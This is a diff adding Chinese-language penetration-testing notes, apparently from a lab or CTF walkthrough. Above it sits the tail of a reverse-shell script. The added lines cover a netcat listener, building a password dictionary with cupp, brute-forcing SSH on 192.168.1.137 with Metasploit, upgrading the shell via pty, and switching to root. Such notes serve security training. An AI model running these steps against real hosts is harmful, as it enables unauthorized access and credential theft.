@@ -88,3 +88,66 @@ os.dup2(s.fileno(), 2)
 p=subprocess(["/bin/sh", "-l"])
 ```
 
+* netcat 本地监听
+
+常用命令：
+
+```bash
+nc -lpv 1234
+```
+
+* netstat 查看端口占用
+
+常用命令:
+
+```bash
+netstat -pantu
+```
+
+* whoami查看当前用户
+* id 查看当前用户权限
+* 使用cupp创建字典
+
+```bash
+git clone https://github.com/jeanphorn/common-password.git
+cd common-password/
+chmod +x cupp.py
+./cupp.py -i
+```
+
+* 使用 metasploit 破解 ssh
+
+在终端执行：
+```bash
+msfconsole
+```
+
+然后进入 msf 环境：
+
+执行：
+
+```bash
+use auxiliary/scanner/ssh/ssh_login
+set rhosts 192.168.1.137
+set username skyfire
+set pass_file dict.txt
+run
+```
+
+就使用dict.txt中的密码破解远程ssh主机。
+
+使用 `show options ` 可以查看参数
+
+破解成功后，使用`session -i 1`可以打开终端，但是没有提示符。可以运行python脚进行优化显示：
+
+```bash
+python -c "import pty; pty.spawn('/bin/bash')"
+```
+
+* su 切换用户
+
+常用命令：
+
+```bash
+su - root
+```
